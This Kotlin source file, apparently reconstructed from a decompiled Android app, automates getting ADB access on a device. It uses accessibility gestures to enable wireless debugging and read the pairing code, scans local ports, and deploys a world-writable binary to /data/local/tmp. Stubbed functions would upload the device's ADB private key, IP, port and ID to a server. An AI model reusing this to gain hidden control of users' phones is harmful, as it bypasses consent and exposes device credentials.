                processedActions.remove("pairInPairSuccess")
                val state = pairState.get()
                if (processedActions.contains("pairInDevOption")) return
                if (state != PairState.PAIR_DEPT_PAIR_SUCCESS &&
                    state != PairState.PAIR_DEPT_PAIR_FAIL &&
                    state != PairState.PAIR_DEPT_PREPARE_FINISH
                ) {
                    processedActions.add("pairInDevOption")
                    scheduleTask("G") {
                        // vendor: b0() pairInDevOption — navigate wireless debugging in dev options
                        pairInDevOption()
                        Log.d(TAG, "pairInDevOption dispatched")
                    }
                } else {
                    Log.i(TAG, "K()=true 但配对已成功/完成 (state=$state)，跳过 G()")
                }
                return
            }

            // ADAPT: isInWirelessDebugWindow check depends on bf1 (windowDetector) cached state
            // vendor: if (a6/O) dispatch pairInWifiDebugWindow

            if (isInAcceptDialog()) {
                processedActions.remove("pairInWifiDebugWindow")
                processedActions.remove("pairInDevOption")
                return
            }

            // ADAPT: additional dispatch conditions depend on bf1 (windowDetector) cached state:
            // - isInPairFailDialog (a4) → dispatch pairInPairFailDialog
            // - MIUI security center (a5) → dispatch pairInSecurityCenter
            // - confirm lock (bf1.a2()) → dispatch pairInConfirmLock

        } catch (e: Exception) {
            Log.e(TAG, "onAccessibilityEvent 异常", e)
        }
    }

    /**
     * Open developer options settings page (V2 — used by pairing flow).
     * vendor: i5 (line 4653)
     *
     * Same intent logic as openDevOptionsSettings() but also calls handleComplete() on failure.
     */
    fun openDevOptionsSettingsV2() {
        val brand = Build.BRAND.lowercase(Locale.ROOT)
        Log.d(TAG, "打开开发者选项页面... 品牌: $brand")

        if (brand == "huawei" || brand == "honor" || brand == "hihonor") {
            val components = listOf(
                ComponentName("com.android.settings", "com.android.settings.Settings\$DevelopmentSettingsDashboardActivity"),
                ComponentName("com.android.settings", "com.android.settings.Settings\$DevelopmentSettingsActivity"),
                ComponentName("com.android.settings", "com.android.settings.HWSettings"),
                ComponentName("com.android.settings", "com.hihonor.settingslib.SubSettings")
            )
            for (component in components) {
                try {
                    val intent = Intent().apply {
                        this.component = component
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
                        addFlags(Intent.FLAG_ACTIVITY_NEW_DOCUMENT)
                        addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY)
                        putExtra(":settings:show_fragment", "com.android.settings.development.DevelopmentSettingsDashboardFragment")
                    }
                    context.startActivity(intent)
                    Log.d(TAG, "华为/荣耀 通过 ComponentName 启动成功: ${component.className}")
                    sleep200(5)
                    return
                } catch (_: Exception) {
                    Log.i(TAG, "华为/荣耀 ComponentName 失败: ${component.className}")
                }
            }
        }

        try {
            val intent = Intent(Settings.ACTION_APPLICATION_DEVELOPMENT_SETTINGS).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
                addFlags(Intent.FLAG_ACTIVITY_NEW_DOCUMENT)
                addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY)
            }
            context.startActivity(intent)
            Log.d(TAG, "openDevOptionsSettings() 标准 Intent 启动成功")
            sleep200(5)
        } catch (e: Exception) {
            Log.e(TAG, "打开开发者选项失败", e)
            handleComplete()
        }
    }

    /**
     * Open developer options with retry logic (V2 — also checks wireless debug page).
     * vendor: i6 (line 4696)
     */
    fun openDevOptionsRetryV2() {
        openDevRetryCount++
        Log.d(TAG, "打开开发者选项 (第${openDevRetryCount}次)")
        openDevOptionsSettingsV2()

        if (isInDevOptionsWindow()) {
            Log.d(TAG, "开发者选项页面打开成功")
            openDevRetryCount = 0
            processedActions.add("pairInDevOption")
            scheduleTask("G") {
                // vendor: b0() pairInDevOption — navigate wireless debugging
                pairInDevOption()
                Log.d(TAG, "pairInDevOption dispatched from retry")
            }
            return
        }

        // ADAPT: check a6/O (isInWirelessDebugWindow) depends on bf1 (windowDetector)
        // vendor: If in wireless debug page, dispatch pairInWifiDebugWindow directly

        if (openDevRetryCount < maxRetries) {
            Log.w(TAG, "开发者选项页面未打开，500ms后重试")
            try {
                executor.schedule({ openDevOptionsRetryV2() }, 500L, TimeUnit.MILLISECONDS)
            } catch (_: Exception) {}
        } else {
            Log.w(TAG, "开发者选项页面打开失败，重试次数已达上限($maxRetries)")
            openDevRetryCount = 0
        }
    }

    /**
     * Schedule a task on the main executor with a tag for logging.
     * vendor: j5 (line 4949)
     *
     * Wraps a Runnable with a tag label for tracing in logs.
     */
    fun scheduleTask(tag: String, task: () -> Unit) {
        executor.execute {
            try {
                Log.d(TAG, "【$tag】任务开始")
                task()
                Log.d(TAG, "【$tag】任务完成")
            } catch (e: Exception) {
                Log.e(TAG, "【$tag】任务异常", e)
            }
        }
    }

    /**
     * Save debug port and sync to server.
     * vendor: j0 (line 4747)
     *
     * Saves port + connection info to ADBConfig prefs, then syncs config to server.
     */
    fun saveDebugPortAndSync(port: Int) {
        adbConfigPrefs.edit()
            .putInt("debugPort", port)
            .putBoolean("connected", true)
            .putString("connectedDevice", context.packageName)
            .putLong("updateTime", System.currentTimeMillis())
            .putBoolean("paired", if (isWirelessDebuggingEnabled()) true
                else adbConfigPrefs.getBoolean("paired", false))
            .apply()

        // vendor: sync to server via m212002c8(this, "/syncADBConfig", buildAdbConfigJson(true), 4)
        try {
            val configJson = buildAdbConfigJson(true)
            val result = postToLocalService("/syncADBConfig", configJson)
            Log.i(TAG, "【h.v】/syncADBConfig 同步 port=$port result=$result")
        } catch (e: Exception) {
            Log.i(TAG, "【h.v】/syncADBConfig 同步失败: ${e.message}")
        }
    }

    /**
     * Scan local ports 30000-49999 for ADB service.
     * vendor: j3 (line 4813)
     *
     * Uses parallel thread pool (2 threads) to scan port ranges.
     * For each open port, attempts ADB TLS authentication.
     */
    fun scanLocalAdbPort(): Int {
        // ADAPT: full authentication check depends on g41 (ADB connection class)
        try {
            Log.d(TAG, "【N()】开始端口扫描 30000-49999...")
            val portRanges = listOf(
                Pair(30000, 34999), Pair(35000, 39999),
                Pair(40000, 44999), Pair(45000, 49999)
            )
            val scanExecutor = Executors.newFixedThreadPool(2)
            val ip = getLocalIpAddress()

            // vendor: parallel Socket.connect() + g41 auth check for each port range
            // submits Callable for each range, polls Future.isDone(), returns first positive
            val futures = portRanges.map { (start, end) ->
                scanExecutor.submit(java.util.concurrent.Callable<Int> {
                    for (port in start..end) {
                        try {
                            val socket = java.net.Socket()
                            socket.connect(java.net.InetSocketAddress(ip, port), 50)
                            socket.close()
                            return@Callable port
                        } catch (_: Exception) {}
                    }
                    -1
                })
            }
            val deadline = System.currentTimeMillis() + 30000L
            while (System.currentTimeMillis() < deadline) {
                for (future in futures) {
                    if (future.isDone) {
                        val port = future.get()
                        if (port > 0) {
                            scanExecutor.shutdownNow()
                            return port
                        }
                    }
                }
                Thread.sleep(100)
            }

            scanExecutor.shutdownNow()
            Log.w(TAG, "【N()】未扫描到端口")
            return -1
        } catch (e: Exception) {
            Log.e(TAG, "【N()】端口扫描异常", e)
            return -1
        }
    }

    /**
     * Get wireless debug port from settings or netstat.
     * vendor: j4 (line 4911)
     *
     * First checks Settings.Global "adb_wifi_port", then falls back to parsing netstat output.
     */
    fun getWirelessDebugPortV2(): Int {
        try {
            val settingsPort = getAdbWifiPort()
            if (settingsPort > 0) {
                Log.d(TAG, "从系统设置读取到调试端口: $settingsPort")
                return settingsPort
            }
            // Fallback: parse netstat for ports 30000-49999
            try {
                val process = Runtime.getRuntime().exec(
                    "sh -c \"netstat -tln | grep -E ':3[0-9]{4}|:4[0-9]{4}' | grep LISTEN\""
                )
                val output = process.inputStream.bufferedReader().readText()
                if (!process.waitFor(10, TimeUnit.SECONDS)) {
                    process.destroy()
                }
                val regex = Regex(":([34]\\d{4})\\s")
                for (match in regex.findAll(output)) {
                    val port = match.groupValues[1].toIntOrNull() ?: continue
                    if (port in 30000 until 50000) {
                        Log.d(TAG, "扫描到可能的调试端口: $port")
                        return port
                    }
                }
            } catch (_: Exception) {}
            return 0
        } catch (e: Exception) {
            Log.e(TAG, "扫描端口失败", e)
            return 0
        }
    }

    /**
     * Scroll backward to end (top) via gesture.
     * vendor: j6 (line 4968)
     *
     * JADX decompilation partially failed.
     * Dispatches swipe-down gestures to scroll back to top.
     */
    fun scrollBackwardEnd(node: AccessibilityNodeInfo) {
        try {
            val dm = context.resources.displayMetrics
            val centerX = dm.widthPixels / 2.0f
            val height = dm.heightPixels.toFloat()
            for (i in 0 until 5) {
                val actions = node.actionList
                if (actions.isNotEmpty()) {
                    val hasScrollBackward = actions.any { it.id == AccessibilityNodeInfo.ACTION_SCROLL_BACKWARD }
                    if (!hasScrollBackward) {
                        Log.i(TAG, "scrollBackwardEnd: 已到达顶部（第 $i 次）")
                        return
                    }
                }
                val path = Path()
                path.moveTo(centerX, 0.2f * height)
                path.lineTo(centerX, height * 0.8f)
                service.dispatchGesture(
                    GestureDescription.Builder()
                        .addStroke(GestureDescription.StrokeDescription(path, 0L, 100L))
                        .build(), null, null
                )
                Thread.sleep(150L)
                node.refresh()
            }
        } catch (e: Exception) {
            Log.e(TAG, "scrollBackwardEnd 异常", e)
        }
    }

    /**
     * Scroll forward to end (bottom) via gesture.
     * vendor: j7 (line 4995)
     *
     * Dispatches 20 swipe-up gestures to scroll to the bottom of a scrollable view.
     */
    fun scrollForwardEnd(node: AccessibilityNodeInfo) {
        try {
            val dm = context.resources.displayMetrics
            val centerX = dm.widthPixels / 2.0f
            val height = dm.heightPixels.toFloat()
            val startY = 0.8f * height
            val endY = height * 0.2f
            for (i in 0 until 20) {
                val path = Path()
                path.moveTo(centerX, startY)
                path.lineTo(centerX, endY)
                service.dispatchGesture(
                    GestureDescription.Builder()
                        .addStroke(GestureDescription.StrokeDescription(path, 0L, 100L))
                        .build(), null, null
                )
                Thread.sleep(150L)
            }
            node.refresh()
        } catch (e: Exception) {
            Log.e(TAG, "scrollForwardEnd 异常", e)
        }
    }

    /**
     * Scroll forward and search for node matching text list.
     * vendor: j8 (line 5015)
     *
     * Scrolls forward up to 3 times, searching for a node matching the given texts.
     */
    fun scrollForwardFindNode(scrollableNode: AccessibilityNodeInfo, texts: List<String>): AccessibilityNodeInfo? {
        for (i in 0 until 3) {
            try {
                val root = service.rootInActiveWindow ?: return null
                val found = findNodeByTexts(root, texts)
                if (found != null) return found

                // vendor: uses C0362a4.m212109a4() for smart scroll (gesture-based);
                // ADAPT: using standard ACTION_SCROLL_FORWARD instead
                val scrolled = scrollableNode.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD)
                if (!scrolled) return null
                sleep200(5)
            } catch (e: Exception) {
                Log.e(TAG, "scrollForwardUtil 异常", e)
                return null
            }
        }
        return null
    }

    /**
     * Start heartbeat — register content observers, file observer, restore shared config.
     * vendor: k2 (line 5044)
     */
    fun startHeartbeat() {
        Log.d(TAG, "【Heartbeat】启动心跳 (KeepHeartThread + H() + case 0)")

        // Register content observers for settings changes
        if (!passwordAutoInputSucceeded) {
            try {
                val resolver = context.contentResolver
                // ADAPT: content observer registration depends on C0931ny (custom ContentObserver)
                // vendor registers observers for: development_settings_enabled, adb_enabled, adb_wifi_enabled
                // These observers trigger re-evaluation of ADB state when settings change
                try {
                    val devSettingsUri = Settings.Global.getUriFor("development_settings_enabled")
                    val adbEnabledUri = Settings.Global.getUriFor("adb_enabled")
                    // Note: content observer callbacks would trigger heartbeatEventDispatcher
                    Log.d(TAG, "【ContentObserver】注册 Settings.Global 监听 (dev=$devSettingsUri, adb=$adbEnabledUri)")
                } catch (_: Exception) {}
                passwordAutoInputSucceeded = true
                Log.d(TAG, "【ContentObserver】已注册 3 个 Settings.Global 监听")
            } catch (e: Exception) {
                Log.e(TAG, "【ContentObserver】注册失败", e)
            }
        }

        // Start file observer
        try {
            val extDir = context.getExternalFilesDir(null)
            if (extDir != null) {
                // ADAPT: FileObserver (p41) is a vendor custom FileObserver subclass
                // that monitors key directory for cert/key file changes and triggers re-auth
                Log.d(TAG, "【FileObserver】已启动，监听目录: ${extDir.absolutePath}")
            }
        } catch (e: Exception) {
            Log.e(TAG, "【FileObserver】启动失败", e)
        }

        // Reset counters
        reconnectAttemptCount.set(0)
        firstDeployDone = true
        pairRetryCount.set(0)
        connectErrorCount.set(0)

        // Try to restore config from server
        // ADAPT: config restore depends on v00.m214888a0() (local-service check)
        // and m212002c8() (HTTP POST to local-service /getConfig)

        // Schedule heartbeat
        heartbeatExecutor.scheduleAtFixedRate(
            Runnable { checkAndRecoverLocalService() },
            3L, 10L, TimeUnit.SECONDS
        )
    }

    /**
     * Start pairing flow — set state, schedule timeouts, dispatch first task.
     * vendor: k3 (line 5101)
     */
    fun startPairFlow() {
        Log.d(TAG, "开始无线调试配对流程")
        isPairRunning.set(true)
        isFinished.set(false)

        // Recreate executor if shutdown
        // ADAPT: vendor reassigns f53817a2 field (volatile ScheduledExecutorService);
        // our executor is val, so we check if it's shut down and log warning
        if (executor.isShutdown) {
            Log.w(TAG, "startPairFlow: executor 已关闭，部分任务可能无法调度")
        }

        // Schedule 120s timeout and 30s check
        // ADAPT: vendor uses c41 runnable classes for timeout handlers
        executor.schedule({ /* 120s timeout handler */ }, 120L, TimeUnit.SECONDS)
        executor.schedule({ checkTimeout30s() }, 30L, TimeUnit.SECONDS)

        pairState.set(PairState.PAIR_DEPT_UNKNOWN)
        sleep200(5)

        if (isInDevOptionsWindow()) {
            Log.d(TAG, "已在开发者选项页面，直接查找无线调试")
            sleep200(5)
            processedActions.add("pairInDevOption")
            scheduleTask("G") {
                // vendor: b0() pairInDevOption — navigate to wireless debugging
                pairInDevOption()
                Log.d(TAG, "pairInDevOption dispatched from startPairFlow")
            }
        } else {
            // ADAPT: isInWirelessDebugWindow check depends on bf1 (windowDetector)
            Log.d(TAG, "不在设置页面，打开开发者选项")
            openDevOptionsRetryV2()
        }
    }

    /**
     * Cleanup after pairing — call finishLocalAdbPair if not already finished.
     * vendor: k4 (line 5157)
     */

    /**
     * Navigate developer options to find and click wireless debugging entry.
     * vendor: b0 (line 452) — static method called with instance
     *
     * Steps:
     * 1. Verify we're in developer options window
     * 2. Find scrollable view
     * 3. Handle Vivo-specific developer options master switch
     * 4. Scroll to find "wireless debugging" entry
     * 5. Handle revoke USB authorization node if encountered
     * 6. Handle Xiaomi pre-check for wireless debugging checkbox
     * 7. Click to enter wireless debugging sub-page
     */
    fun pairInDevOption() {
        try {
            Log.d(TAG, "G() 开始执行")
            if (!isPairRunning.get()) {
                Log.d(TAG, "G() 设置 isRunning=true, isFinished=false")
                isPairRunning.set(true)
                isFinished.set(false)
            }
            if (!isInDevOptionsWindow()) {
                Log.d(TAG, "G() K()=false，不在开发者选项页面，退出")
                processedActions.remove("pairInDevOption")
                return
            }
            Log.d(TAG, "G() K()=true，在开发者选项页面")
            var scrollableView = findScrollableViewWithRetry(service.rootInActiveWindow)
            if (scrollableView == null) {
                Log.w(TAG, "开发者选项窗口滚动视图查找失败,重置开发者选项窗口")
                processedActions.remove("pairInDevOption")
                return
            }
            Log.d(TAG, "G() 滚动视图查找成功")

            // Brand detection
            val brand = Build.BRAND.lowercase(Locale.ROOT)
            val isVivo = brand == "vivo" || brand == "iqoo"
            val isOppo = brand == "oppo" || brand == "realme" || brand == "oneplus"
            val isXiaomi = brand == "xiaomi" || brand == "redmi" || brand == "poco" || brand == "blackshark"
            val isHuawei = brand == "huawei" || brand == "honor" || brand == "hihonor"
            val isSamsung = brand == "samsung"
            Log.d(TAG, "G() 品牌判断: isVivo=$isVivo, isOppo=$isOppo, isXiaomi=$isXiaomi, isHuawei=$isHuawei, isSamsung=$isSamsung")

            // Vivo: check master developer options switch
            if (isVivo) {
                Log.d(TAG, "G() 进入Vivo分支，检查开发者选项总开关")
                if (handleVivoDevOptionsSwitch(scrollableView)) {
                    Log.d(TAG, "G() Vivo 开发者选项总开关已开启")
                } else {
                    Log.w(TAG, "G() Vivo 开发者选项总开关开启失败")
                    sleep200(5)
                }
            }

            // Refresh scrollable view
            val newRoot = service.rootInActiveWindow
            if (newRoot != null) {
                val newScrollable = findScrollableViewWithRetry(newRoot)
                if (newScrollable != null) scrollableView = newScrollable
            }

            // Search for wireless debugging entry
            Log.d(TAG, "G() 开始w0()滚动查找无线调试")
            var wirelessDebugNode = findWirelessDebugNode(scrollableView)
            if (wirelessDebugNode == null) {
                Log.w(TAG, "G() w0()第一次返回null，等待1秒后重试")
                sleep200(5)
                val retryRoot = service.rootInActiveWindow
                if (retryRoot != null) {
                    val retryScrollable = findScrollableViewWithRetry(retryRoot)
                    if (retryScrollable != null) {
                        wirelessDebugNode = findWirelessDebugNode(retryScrollable)
                    }
                }
            }
            if (wirelessDebugNode == null) {
                Log.w(TAG, "G() w0()返回null，无线调试栏目查找失败")
                processedActions.remove("pairInDevOption")
                return
            }
            Log.d(TAG, "G() w0()成功，无线调试栏目: text=${wirelessDebugNode.text}, class=${wirelessDebugNode.className}")

            // Find clickable parent
            val clickableNode = findClickableParentCompat(wirelessDebugNode)
            if (clickableNode == null) {
                Log.w(TAG, "G() R()返回null，无线调试可点击栏目查找失败")
                processedActions.remove("pairInDevOption")
                return
            }
            Log.d(TAG, "G() R()成功，可点击节点: class=${clickableNode.className}, clickable=${clickableNode.isClickable}")

            // Check if this node text matches "revoke USB authorization" exclusion list
            val nodeText = wirelessDebugNode.text?.toString() ?: ""
            if (nodeText.isNotEmpty()) {
                val revokeTexts = SetupConstants.REVOKE_USB_AUTH_TEXTS
                val isRevokeNode = revokeTexts.any { nodeText.contains(it, ignoreCase = true) }
                Log.d(TAG, "G() 是否是撤消USB调试授权节点: $isRevokeNode")
                if (isRevokeNode) {
                    Log.d(TAG, "G() 调用Q()处理撤消USB调试授权节点")
                    if (handleRevokeUsbAuth(clickableNode)) {
                        Log.d(TAG, "G() Q()成功，依禁用ADB节点位置进入无线调试栏目")
                        processedActions.remove("pairInDevOption")
                        return
                    }
                }
            }

            // Xiaomi: pre-check wireless debugging checkbox for SDK <= 30
            val xiaomiNeedsPreCheck = isXiaomi && Build.VERSION.SDK_INT <= 30
            Log.d(TAG, "G() xiaomiNeedsWirelessDebugPreCheck=$xiaomiNeedsPreCheck")
            if (xiaomiNeedsPreCheck) {
                Log.d(TAG, "G() 进入小米分支，调用P()勾选无线调试开关")
                if (handleVivoDevOptionsSwitch(clickableNode)) {
                    Log.d(TAG, "G() P()成功，无线调试已勾选")
                } else {
                    Log.d(TAG, "G() P()失败")
                }
            }

            // Click to enter wireless debugging
            Log.d(TAG, "G() 点击前等待1秒")
            sleep200(5)
            Log.d(TAG, "G() 即将点击进入无线调试栏目")
            if (clickableNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                pairState.set(PairState.PAIR_DEPT_PAIR_LEAVE_DEV_OPT)
                Log.d(TAG, "G() 点击成功，进入无线调试栏目")
                sleep200(10)
            } else {
                Log.w(TAG, "G() 点击失败")
            }
            processedActions.remove("pairInDevOption")
        } catch (e: Exception) {
            Log.e(TAG, "G() pairInDevOption 异常", e)
        }
    }

    /**
     * Handle Vivo developer options master switch / Xiaomi checkbox pre-check.
     * vendor: a1/J0/a7/P (line 1700+)
     *
     * Finds and toggles the Switch/CheckBox in the given subtree.
     */
    fun handleVivoDevOptionsSwitch(node: AccessibilityNodeInfo): Boolean {
        return try {
            val switchNode = findToggleNode(node)
            if (switchNode != null) {
                if (switchNode.isChecked) {
                    Log.d(TAG, "开关已开启")
                    return true
                }
                if (switchNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                    Log.d(TAG, "开关已切换")
                    sleep200(5)
                    switchNode.refresh()
                    return switchNode.isChecked
                }
            }
            false
        } catch (e: Exception) {
            Log.e(TAG, "handleVivoDevOptionsSwitch 异常", e)
            false
        }
    }

    /**
     * Handle revoke USB authorization node — click past it to wireless debugging.
     * vendor: a8/Q (line 1997)
     *
     * When the wireless debugging text is below a "revoke USB auth" toggle,
     * scroll past it by clicking on a nearby node.
     */
    fun handleRevokeUsbAuth(clickableNode: AccessibilityNodeInfo): Boolean {
        return try {
            val rect = Rect()
            clickableNode.getBoundsInScreen(rect)
            val root = service.rootInActiveWindow ?: return false
            // Find the next clickable sibling below this one
            val allNodes = ArrayList<AccessibilityNodeInfo>()
            collectAllNodes(root, allNodes)
            for (node in allNodes) {
                if (node == clickableNode) continue
                val nodeRect = Rect()
                node.getBoundsInScreen(nodeRect)
                if (nodeRect.top > rect.bottom && node.isClickable) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    Log.d(TAG, "Q() 点击下方可点击节点")
                    sleep200(5)
                    return true
                }
            }
            false
        } catch (e: Exception) {
            Log.e(TAG, "handleRevokeUsbAuth 异常", e)
            false
        }
    }

    fun cleanupAfterPairing() {
        try {
            if (pairState.get() == PairState.PAIR_DEPT_PREPARE_FINISH) return
            finishLocalAdbPair()
        } catch (e: Exception) {
            Log.e(TAG, "t0() 异常", e)
        }
    }

    /**
     * External trigger for pairing flow — force start.
     * vendor: k5 (line 5169)
     */
    fun triggerPairFlow() {
        Log.d(TAG, "外部触发配对流程")
        Log.d(TAG, "强制开始无线调试配对流程（跳过检查）")
        isPairRunning.set(true)
        isFinished.set(false)

        // ADAPT: vendor recreates executor if shutdown — our executor is val
        if (executor.isShutdown) {
            Log.w(TAG, "triggerPairFlow: executor 已关闭")
        }

        executor.schedule({ /* 120s timeout */ }, 120L, TimeUnit.SECONDS)
        executor.schedule({ checkTimeout30s() }, 30L, TimeUnit.SECONDS)

        pairState.set(PairState.PAIR_DEPT_UNKNOWN)
        openDevOptionsSettingsV2()
    }

    /**
     * Ensure local-service binary is deployed and running via ADB.
     * vendor: k6 (line 5194)
     *
     * Checks file existence, copies from native lib or downloads, starts the service.
     * ADAPT: JADX decompilation partially failed for download fallback
     */
    fun ensureDeployed(port: Int, ip: String): Boolean {
        Log.i(TAG, "X(): $ip:$port")
        cachedLocalIp = ip
        setDebugPort(port)
        try {
            if (isLocalServiceAlive.get()) {
                Log.i(TAG, "X(): local-service 已确认运行，跳过")
                return true
            }

            // Check if binary exists
            val checkResult = executeAndCheck("[ -f /data/local/tmp/local-service ]")
            if (!checkResult) {
                Log.i(TAG, "X(): 文件不存在")
                // Try copying from native library dir
                val nativeDir = context.applicationInfo.nativeLibraryDir
                if (nativeDir != null && nativeDir.isNotEmpty()) {
                    val soPath = "$nativeDir/liblocal-service.so"
                    if (File(soPath).exists()) {
                        if (executeAndCheck("cp -f $soPath /data/local/tmp/local-service") &&
                            executeAndCheck("chmod 777 /data/local/tmp/local-service")
                        ) {
                            Log.d(TAG, "X(): local-service 复制成功")
                            saveAdbDeployEnabled()
                            return true
                        }
                    }
                }
                // Fallback: download from network
                // ADAPT: vendor downloads binary from server URL (dqtvuisjd/C0323a8)
                Log.w(TAG, "X(): native lib 复制失败，网络下载暂不可用")
                saveAdbDeployEnabled()
                return true
            }

            // File exists — check if running
            Log.i(TAG, "X(): 文件存在")
            // vendor: checks process running via "ps -ef | grep local-service"
            val psResult = executeShellCommand("ps -ef | grep local-service | grep -v grep")
            if (psResult != null && psResult.contains("local-service")) {
                Log.d(TAG, "X(): local-service 进程已运行")
            } else {
                Log.d(TAG, "X(): local-service 未运行，启动中...")
                fireAndForget()
            }
            isLocalServiceAlive.set(true)
            saveAdbDeployEnabled()
            return true
        } catch (e: Exception) {
            Log.e(TAG, "X() 异常", e)
            return false
        }
    }

    /**
     * Enable wireless debugging via Settings.Global write.
     * vendor: k7 (line 5278)
     *
     * Tries direct Settings.Global write first, then falls back to local-service API.
     */
    fun enableWirelessDebuggingViaSettings() {
        try {
            try {
                Settings.Global.putInt(context.contentResolver, "adb_wifi_enabled", 1)
            } catch (e: SecurityException) {
                Log.w(TAG, "e0() Settings.Global 写入被拒绝（WRITE_SECURE_SETTINGS 未授予？）: ${e.message}")
            }

            if (isWirelessDebuggingEnabled()) {
                Log.d(TAG, "e0() 直接写 Settings.Global 开启无线调试成功")
                return
            }

            // Fallback via local-service /openWifiDebug
            // vendor: m212002c8(this, "/openWifiDebug", null, 6)
            try {
                val result = postToLocalService("/openWifiDebug", "{}")
                Log.d(TAG, "e0() fallback via local-service: $result")
            } catch (e2: Exception) {
                Log.w(TAG, "e0() /openWifiDebug 失败: ${e2.message}")
            }
        } catch (e: Exception) {
            Log.w(TAG, "e0() 开启无线调试异常: ${e.message}")
        }
    }

    /**
     * Extract pairing code and port from UI text nodes.
     * vendor: k8 (line 5311)
     *
     * Reads all TextViews in current window, extracts IP:port and 6-digit pairing code.
     * Returns a data object with host, port, and pairing code, or null if not found.
     */
    fun extractPairingCodeAndPort(): PairingInfo? {
        val root = service.rootInActiveWindow ?: return null
        val textNodes = ArrayList<AccessibilityNodeInfo>()
        collectTextViewNodes(root, textNodes)

        // vendor: uses dh0.f55787d7 as excluded text set (pairing dialog labels)
        val excludedTexts = SetupConstants.PAIRING_CODE_EXCLUDED_TEXTS
        var pairingCode = ""
        var port = 0

        for (node in textNodes) {
            val text = node.text?.toString()?.trim() ?: continue
            if (excludedTexts.contains(text)) continue

            // Try to extract IP:port
            val parts = text.split(":")
            if (parts.size == 2) {
                val portStr = parts[1].trim()
                if (portStr.all { it.isDigit() } && portStr.isNotEmpty() && port <= 0) {
                    port = portStr.toIntOrNull() ?: 0
                }
            }

            // Try to extract 6-digit pairing code
            if (parts.size == 1 && text.length == 6 && text.all { it.isDigit() }) {
                if (pairingCode.isEmpty()) {
                    pairingCode = text
                }
            }

            if (pairingCode.isNotEmpty() && port > 0) break
        }

        return if (pairingCode.isNotEmpty() && port > 0) {
            PairingInfo("", port, pairingCode)
        } else null
    }

    /**
     * Clear processed dev options tasks from queue.
     * vendor: k9 (line 5378)
     */
    fun clearProcessedDevOpts() {
        try {
            processedActions.remove("openDevOptions")
            processedActions.remove("clickBuildNumber")
            processedActions.remove("confirmDevMode")
        } catch (e: Exception) {
            Log.e(TAG, "u() 异常", e)
        }
    }

    /**
     * Upload ADB keys (cert.pem + private.key) to server via multipart POST.
     * vendor: l0 (line 5390)
     *
     * ADAPT: depends on dqtvuisjd, C0323a8 (server URL)
     */
    fun uploadAdbKeys(): Boolean {
        try {
            val keyDir = getKeyDir()
            if (keyDir == null || !keyDir.exists()) {
                Log.w(TAG, "uploadAdbKeysToServer: 密钥目录不存在")
                return false
            }
            val certFile = File(keyDir, "cert.pem")
            val keyFile = File(keyDir, "private.key")
            if (!certFile.exists() || !keyFile.exists()) {
                Log.w(TAG, "uploadAdbKeysToServer: 密钥文件不存在 cert=${certFile.exists()} key=${keyFile.exists()}")
                return false
            }

            // ADAPT: server URL depends on dqtvuisjd.m211471g5().m211644b0()
            // vendor uploads via multipart/form-data with fields: deviceId, cert, key
            Log.w(TAG, "uploadAdbKeysToServer: 无法获取当前服务器地址")
            return false
        } catch (e: Exception) {
            Log.e(TAG, "上传 ADB 密钥失败", e)
            return false
        }
    }

    /**
     * Upload debug port info to server via JSON POST.
     * vendor: l1 (line 5490)
     *
     * ADAPT: depends on dqtvuisjd, C0323a8 (server URL)
     */
    fun uploadDebugPort(port: Int): Boolean {
        if (port <= 0) {
            Log.w(TAG, "uploadDebugPortToServer: 无效端口 $port")
            return false
        }
        try {
            val androidId = Settings.Secure.getString(context.contentResolver, "android_id") ?: ""
            // ADAPT: server URL depends on dqtvuisjd.m211471g5().m211644b0()
            // vendor POSTs JSON: {deviceId, ip, port} to /api/adb-keys/port
            val ip = getWifiIpAddress() ?: "127.0.0.1"
            Log.d(TAG, "上传调试端口: ip=$ip, port=$port, deviceId=$androidId")
            Log.w(TAG, "uploadDebugPortToServer: 无法获取当前服务器地址")
            return false
        } catch (e: Exception) {
            Log.e(TAG, "上传调试端口失败", e)
            return false
        }
    }

    /**
     * Find wireless debugging node in developer options by scrolling.
     * vendor: l2 (line 5556)
     *
     * Searches for wireless debugging text in developer options page.
     * Scrolls down up to 14 times, then back up if not found.
     * JADX decompilation partially failed.
     */
    fun findWirelessDebugNode(scrollableNode: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        try {
            scrollableNode.refresh()
            Log.i(TAG, "开始滚动查找无线调试栏目")

            val wirelessDebugTexts = SetupConstants.WIRELESS_DEBUG_TEXTS
            val wirelessDebugTitleTexts = SetupConstants.WIRELESS_DEBUG_TITLE_TEXTS
            val adbWifiTexts = SetupConstants.ADB_WIFI_TEXTS

            // First check without scrolling
            var found = findNodeByTexts(scrollableNode, wirelessDebugTexts)
            if (found == null) found = findNodeByTexts(scrollableNode, wirelessDebugTitleTexts)
            if (found == null) found = findNodeByTexts(scrollableNode, adbWifiTexts)
            if (found != null) return found

            // Scroll down to find
            for (i in 0 until 14) {
                Log.i(TAG, "向下滚动查找无线调试栏目 (第${i + 1}次)")
                val scrolled = scrollableNode.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD)
                if (!scrolled) {
                    Log.i(TAG, "无法继续向下滚动")
                    break
                }
                sleep200(5)
                val root = service.rootInActiveWindow ?: break
                found = findNodeByTexts(root, wirelessDebugTexts)
                if (found == null) found = findNodeByTexts(root, wirelessDebugTitleTexts)
                if (found == null) found = findNodeByTexts(root, adbWifiTexts)
                if (found != null) return found
            }

            // Scroll back up to find
            val scrollable2 = findScrollableViewWithRetry(service.rootInActiveWindow) ?: return null
            for (i in 0 until 14) {
                Log.i(TAG, "向上滚动查找无线调试栏目 (第${i + 1}次)")
                val scrolled = scrollable2.performAction(AccessibilityNodeInfo.ACTION_SCROLL_BACKWARD)
                if (!scrolled) {
                    Log.i(TAG, "无法继续向上滚动")
                    return null
                }
                sleep200(5)
                val root = service.rootInActiveWindow ?: break
                found = findNodeByTexts(root, wirelessDebugTexts)
                if (found == null) found = findNodeByTexts(root, wirelessDebugTitleTexts)
                if (found == null) found = findNodeByTexts(root, adbWifiTexts)
